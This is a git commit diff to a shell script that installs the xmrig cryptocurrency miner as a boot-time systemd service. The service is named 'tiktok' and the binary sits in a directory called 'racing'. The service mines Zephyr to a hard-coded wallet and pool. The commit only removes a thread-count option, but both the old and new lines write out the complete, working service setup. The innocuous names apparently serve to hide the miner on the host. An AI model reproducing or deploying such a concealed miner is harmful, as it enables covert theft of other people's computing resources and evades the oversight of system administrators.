41a84510849211aff5628ca8cbc846120c6d411a
gcpmore8668 <gcp.more8668@gmail.com>
2024-07-04 11:50:15 +0700

    Update zephjobs.sh

--- zephjobs.sh
+++ zephjobs.sh
@@ -18,7 +18,7 @@ sudo apt update
 sudo tar xvzf xmrig-6.21.3-linux-static-x64.tar.gz
 # Move the xmrig directory to racing
 sudo mv xmrig-6.21.3 racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing/xmrig --donate-level 1 -o de.zephyr.herominers.com:1123 -u ZEPHYR3eByAcNNfyKzfAHtJaoTrJ3nnfn4qZSjAX4SPT14wYvNmne8jaei24JjUXpb1WrPqNgXgaVCVZr1Cy566NCdB7YL3juVa51 -p '$worker_name' -a rx/0 -k -t '$worker_thread'\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/tiktok.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing/xmrig --donate-level 1 -o de.zephyr.herominers.com:1123 -u ZEPHYR3eByAcNNfyKzfAHtJaoTrJ3nnfn4qZSjAX4SPT14wYvNmne8jaei24JjUXpb1WrPqNgXgaVCVZr1Cy566NCdB7YL3juVa51 -p '$worker_name' -a rx/0 -k\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/tiktok.service'
 sudo systemctl daemon-reload
 sudo systemctl enable tiktok.service
 echo "Setup completed!"
